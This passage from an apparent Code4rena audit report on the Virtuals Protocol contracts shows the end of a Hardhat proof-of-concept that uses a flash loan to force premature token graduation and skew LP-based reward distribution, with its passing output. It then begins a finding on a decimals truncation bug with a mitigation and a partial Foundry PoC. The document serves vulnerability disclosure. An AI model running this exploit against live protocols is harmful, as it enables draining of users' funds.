<span class="grvsc-line"><span class="grvsc-source">    console.log(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "- Founder CAT:",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      formatEther(initialBalances.founderCatBefore)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Buy memecoin with flashloaned funds to trigger graduation</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await expect(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      bonding.connect(trader).buy(parseEther("35000"), tokenInfo.token)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ).to.emit(bonding, "Graduated");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Check if token graduated</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tokenInfoAfterGraduation = await bonding.tokenInfo(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      bonding.tokenInfos(0)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(tokenInfoAfterGraduation.agentToken).to.not.equal(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "0x0000000000000000000000000000000000000000"</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(tokenInfoAfterGraduation.tradingOnUniswap).to.equal(true);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Agent token created:", tokenInfoAfterGraduation.agentToken);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Record trader's CAT token balance</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const traderCatBalance = await ethers</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .getContractAt("IERC20", tokenInfo.token)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .then((token) =&gt; token.balanceOf(trader.address));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Trader CAT balance:", formatEther(traderCatBalance));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 3: Unwrap tokens to receive agent tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await bonding</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(trader)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .unwrapToken(tokenInfo.token, [trader.address]);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Check agent token balance after unwrapping</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentToken = await ethers.getContractAt(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "IERC20",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenInfoAfterGraduation.agentToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const traderAgentTokenBalance = await agentToken.balanceOf(trader.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "Trader agent token balance after unwrap:",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      formatEther(traderAgentTokenBalance)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 4: Trade agent tokens for virtual tokens in Uniswap pair</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // We need to get uniswap pair and router</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const uniswapFactory = await ethers.getContractAt(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "IUniswapV2Factory",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.UNISWAP_FACTORY</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const uniswapPair = await uniswapFactory.getPair(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      virtualToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenInfoAfterGraduation.agentToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Uniswap pair:", uniswapPair);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const uniswapRouter = await ethers.getContractAt(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "IUniswapV2Router02",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.UNISWAP_ROUTER</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Approve agent tokens to be spent by router</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(trader)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .approve(uniswapRouter.target, traderAgentTokenBalance);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Swap agent tokens for virtual tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await uniswapRouter</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(trader)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .swapExactTokensForTokensSupportingFeeOnTransferTokens(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        traderAgentTokenBalance,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        0, // Accept any amount of tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">        [tokenInfoAfterGraduation.agentToken, virtualToken.target],</span></span>
<span class="grvsc-line"><span class="grvsc-source">        trader.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        Math.floor(Date.now() / 1000) + 60 * 20 // 20 minutes from now</span></span>
<span class="grvsc-line"><span class="grvsc-source">      );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 5: Check balances after swap to verify flash loan repayment</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const finalVirtualBalance = await virtualToken.balanceOf(trader.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "Final trader VIRTUAL balance:",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      formatEther(finalVirtualBalance)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Verify that trader has enough to repay flash loan</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Flash loan amount:", formatEther(flashLoanAmount));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "Difference:",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ((flashLoanAmount - finalVirtualBalance) * 100n) / flashLoanAmount</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // A typical flash loan would require the balance to be &gt;= the loan amount</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Due to fees and taxes, there should be a small difference</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 6: Check if the uniswap LP tokens are automatically staked in veToken</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Since this is the first agent created, its ID should be 1</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const virtualId = 1;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const lpInfo = await agentNft.virtualLP(virtualId);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Virtual ID:", virtualId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("LP token:", lpInfo.pool);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("veToken:", lpInfo.veToken);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Check LP staking</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const veToken = await ethers.getContractAt("AgentVeToken", lpInfo.veToken);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const founderVeTokenBalance = await veToken.balanceOf(founder.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("founder veToken balance:", formatEther(founderVeTokenBalance));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 7: Delegate to self to be eligible for rewards</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (founderVeTokenBalance &gt; 0) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await veToken.connect(founder).delegate(founder.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">      console.log("Trader delegated to self");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 8: Distribute rewards and verify allocation</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Deploy rewards contract to verify reward allocation</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Setting up rewards contract for validation...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const rewardsFactory = await ethers.getContractFactory("AgentRewardV3");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const rewards = await upgrades.deployProxy(rewardsFactory, [</span></span>
<span class="grvsc-line"><span class="grvsc-source">      virtualToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      agentNft.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        protocolShares: 1000, // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">        stakerShares: 9000, // 90%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      },</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ]);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await rewards.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Grant governance role to deployer</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await rewards.grantRole(await rewards.GOV_ROLE(), deployer.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Check LP value (should be based on VIRTUAL token in the pool)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const lpValue = await rewards.getLPValue(virtualId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("LP value for virtualId 1:", formatEther(lpValue));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Mint some VIRTUAL tokens to distribute as rewards</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const rewardAmount = parseEther("10000"); // 10,000 VIRTUAL tokens as rewards</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.mint(deployer.address, rewardAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.approve(rewards.target, rewardAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Distribute rewards</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await rewards.distributeRewards(rewardAmount, [virtualId], false);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Rewards distributed");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Check rewards allocation</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentRewardCount = await rewards.agentRewardCount(virtualId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Agent reward count:", agentRewardCount.toString());</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Verify rewards were allocated</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(agentRewardCount).to.be.gt(0);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Access the first agent reward directly</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentReward = await rewards.getAgentReward(virtualId, 0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Agent reward details:");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("- Staker Amount:", formatEther(agentReward.stakerAmount));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "- Validator Amount:",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      formatEther(agentReward.validatorAmount)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("- Total Staked:", formatEther(agentReward.totalStaked));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Both stakers and validators receive rewards from the manipulated LP value</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(agentReward.stakerAmount).to.be.gt(0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(agentReward.validatorAmount).to.be.gt(0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span></code></pre>
</details>
<p>See test results:</p>
<pre data-index="47" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  Bonding</span></span>
<span class="grvsc-line"><span class="grvsc-source">Token created: 0xeC05bC6e8B4DEc3299fA25BDFBd44A43Db415995</span></span>
<span class="grvsc-line"><span class="grvsc-source">Flash loan acquired: 100000.0 VIRTUAL</span></span>
<span class="grvsc-line"><span class="grvsc-source">Initial balances:</span></span>
<span class="grvsc-line"><span class="grvsc-source">- Trader VIRTUAL: 100000.0</span></span>
<span class="grvsc-line"><span class="grvsc-source">- Pair VIRTUAL: 100.0</span></span>
<span class="grvsc-line"><span class="grvsc-source">- Founder CAT: 32258064.516129032258064517</span></span>
<span class="grvsc-line"><span class="grvsc-source">Agent token created: 0x08BD7109ed9c72771A4e494D155e2F31C65205D9</span></span>
<span class="grvsc-line"><span class="grvsc-source">Trader CAT balance: 889001778.003556007112014224</span></span>
<span class="grvsc-line"><span class="grvsc-source">Trader agent token balance after unwrap: 889001778.003556007112014224</span></span>
<span class="grvsc-line"><span class="grvsc-source">Uniswap pair: 0x23457Bea4813642d6f3d4BFDDD461d7f738639cF</span></span>
<span class="grvsc-line"><span class="grvsc-source">Final trader VIRTUAL balance: 97209.656939017097749081</span></span>
<span class="grvsc-line"><span class="grvsc-source">Flash loan amount: 100000.0</span></span>
<span class="grvsc-line"><span class="grvsc-source">Difference: 2n</span></span>
<span class="grvsc-line"><span class="grvsc-source">Virtual ID: 1</span></span>
<span class="grvsc-line"><span class="grvsc-source">LP token: 0x23457Bea4813642d6f3d4BFDDD461d7f738639cF</span></span>
<span class="grvsc-line"><span class="grvsc-source">veToken: 0x75D4c71311994307616350d38f2E832A57440da5</span></span>
<span class="grvsc-line"><span class="grvsc-source">founder veToken balance: 1662461.882480317200970858</span></span>
<span class="grvsc-line"><span class="grvsc-source">Trader delegated to self</span></span>
<span class="grvsc-line"><span class="grvsc-source">Setting up rewards contract for validation...</span></span>
<span class="grvsc-line"><span class="grvsc-source">LP value for virtualId 1: 2890.343060982902250919</span></span>
<span class="grvsc-line"><span class="grvsc-source">Rewards distributed</span></span>
<span class="grvsc-line"><span class="grvsc-source">Agent reward count: 1</span></span>
<span class="grvsc-line"><span class="grvsc-source">Agent reward details:</span></span>
<span class="grvsc-line"><span class="grvsc-source">- Staker Amount: 9000.0</span></span>
<span class="grvsc-line"><span class="grvsc-source">- Validator Amount: 1000.0</span></span>
<span class="grvsc-line"><span class="grvsc-source">- Total Staked: 1662461.882480317200970858</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ✔ flash loan attack force premature graduation, manipulating rewards (1053ms)</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">1 passing (1s)</span></span></code></pre>
<p>Note: in order to run tests, I forked eth mainnet in hardhat network and used mainnet <code>UNISWAP_ROUTER</code> and <code>UNISWAP_FACTORY</code> addresses. I also tweaked <code>.env</code> and hardhat config accordingly. </p>
<p>Run test: npx hardhat test <code>test/bonding.js</code>.</p>
<hr>
<h2 style="position:relative;" id="m-05-division-in-bondingsol_opentradingonuniswap-results-in-an-incorrect-lpsupply-higher-vaultsupply-and-dust-agenttokens-getting-locked-in-fpair"><a class="anchor before" aria-label="m 05 division in bondingsol_opentradingonuniswap results in an incorrect lpsupply higher vaultsupply and dust agenttokens getting locked in fpair permalink" href="#m-05-division-in-bondingsol_opentradingonuniswap-results-in-an-incorrect-lpsupply-higher-vaultsupply-and-dust-agenttokens-getting-locked-in-fpair"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-13">[M-05] Division in <code>Bonding.sol._openTradingOnUniswap()</code> results in an incorrect <code>lpSupply</code>, higher <code>vaultSupply</code>, and dust <code>AgentTokens</code> getting locked in <code>FPair</code></a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-312">BowTiedOriole</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-555">YouCrossTheLineAlfie</a></em></p>
<p>When a Prototype Agent graduates to a Sentient Agent, agent tokens are minted to the <code>FPair</code> contract. Users are then able to call <code>Bonding.unwrapToken()</code> to claim their agent tokens.</p>
<p>Upon graduation, the Bonding contract will divide the token supply as well as the <code>tokenBalance</code> by <code>10 ** 18</code>.</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/Bonding.sol#L390-L395">Bonding.sol#L390-L395</a></p>
<pre data-index="48" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">agentToken</span><span class="mtk1"> = </span><span class="mtk11">IAgentFactoryV3</span><span class="mtk1">(</span><span class="mtk12">agentFactory</span><span class="mtk1">).</span><span class="mtk11">executeBondingCurveApplication</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">id</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_token</span><span class="mtk1">.</span><span class="mtk12">data</span><span class="mtk1">.</span><span class="mtk12">supply</span><span class="mtk1"> / (</span><span class="mtk7">10</span><span class="mtk1"> ** </span><span class="mtk12">token_</span><span class="mtk1">.</span><span class="mtk11">decimals</span><span class="mtk1">()),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">tokenBalance</span><span class="mtk1"> / (</span><span class="mtk7">10</span><span class="mtk1"> ** </span><span class="mtk12">token_</span><span class="mtk1">.</span><span class="mtk11">decimals</span><span class="mtk1">()),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">pairAddress</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span></code></pre>
<p>Within <code>AgentFactoryV3.executeBondingCurveApplication()</code>, these parameters are used to calculate the vault supply.</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentFactoryV3.sol#L466-L480">AgentFactoryV3.sol#L466-480</a></p>
<pre data-index="49" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">bytes</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">tokenSupplyParams</span><span class="mtk1"> = </span><span class="mtk12">abi</span><span class="mtk1">.</span><span class="mtk11">encode</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">totalSupply</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">lpSupply</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">/* vaultSupply */</span><span class="mtk1"> </span><span class="mtk12">totalSupply</span><span class="mtk1"> - </span><span class="mtk12">lpSupply</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">totalSupply</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">totalSupply</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk7">0</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">vault</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span></code></pre>
<p>Then, within <code>AgentToken.initialize()</code>, the provided numbers will be multiplied by <code>10 ** 18</code>. </p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentToken.sol#L95-L96">AgentToken.sol#L95-L96</a></p>
<pre data-index="50" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">lpSupply</span><span class="mtk1"> = </span><span class="mtk12">supplyParams</span><span class="mtk1">.</span><span class="mtk12">lpSupply</span><span class="mtk1"> * (</span><span class="mtk7">10</span><span class="mtk1"> ** </span><span class="mtk11">decimals</span><span class="mtk1">());</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">vaultSupply</span><span class="mtk1"> = </span><span class="mtk12">supplyParams</span><span class="mtk1">.</span><span class="mtk12">vaultSupply</span><span class="mtk1"> * (</span><span class="mtk7">10</span><span class="mtk1"> ** </span><span class="mtk11">decimals</span><span class="mtk1">());</span></span></span></code></pre>
<p>When <code>lpSupply</code> is calculated as <code>tokenBalance / (10 ** token_.decimals())</code> it will truncate any remainder after dividing by 1 ether. Then it will be multiplied by <code>10 ** token_.decimals()</code> which results in a value that is smaller than the original <code>lpSupply</code>. This will result in <code>vaultSupply</code> being too big and <code>AgentTokens</code> being stuck in the <code>FPair</code> contract.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-10"><a class="anchor before" aria-label="recommended mitigation steps 10 permalink" href="#recommended-mitigation-steps-10"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Remove the division and then multiplication by <code>10 ** token_.decimals()</code>. Simply pass through the full wei value.</p>
<h3 style="position:relative;" id="proof-of-concept-8"><a class="anchor before" aria-label="proof of concept 8 permalink" href="#proof-of-concept-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<pre data-index="51" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// SPDX-License-Identifier: UNLICENSED</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pragma</span><span class="mtk1"> </span><span class="mtk12">solidity</span><span class="mtk1"> ^</span><span class="mtk7">0.8</span><span class="mtk1">.</span><span class="mtk7">13</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">Test</span><span class="mtk1">, </span><span class="mtk12">console</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"forge-std/Test.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IERC20</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">spender</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">totalSupply</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IBonding</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">launch</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_name</span><span class="mtk1">,</span></span></span>
